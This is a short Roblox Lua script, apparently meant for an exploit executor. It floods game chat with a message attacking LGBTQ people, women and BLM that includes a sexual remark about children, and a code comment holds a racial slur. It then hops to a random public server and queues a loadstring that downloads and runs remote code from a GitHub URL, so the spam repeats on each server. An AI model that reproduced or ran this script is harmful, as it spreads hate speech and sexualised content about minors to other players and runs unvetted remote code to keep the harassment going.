if not game:IsLoaded() then 
     game.Loaded:Wait()
end 
 
local Time = tick()

wait(5)
 
while tick() - Time <= 25 do 
     game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("LGBTQ & FURRY ARE FATHERLESS 🚪🚶🏼‍♂️ BLM FAKE ✊🏻 CHILDREN MAKE MY NDIICCKKK GROW WOMEN RIGHTS ARE FALSE 🤡 IMAGINE SUPPORTING LGBTQ 🤣💀 GLORY TO RUSSIA 🇷🇺 🚹 > 🚺  ✅  🚹  > 🚹 ❌ 🚺 > 🚺 ❌ ONLY 2 GENDAR", "All") -- FUCK ROBLOX FUCKING NIGGERS
     game.RunService.Heartbeat:Wait()
end 

wait(2)

local Servers = {}
for _, v in ipairs(game.HttpService:JSONDecode(game:HttpGetAsync(string.format("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100", game.PlaceId))).data) do
     if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
          Servers[#Servers + 1] = v.id 
     end
end

if #Servers > 0 then
     syn.queue_on_teleport("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/BedwarsSuperCoolPro/test-cool/main/h\"))()")
     game.TeleportService:TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
end
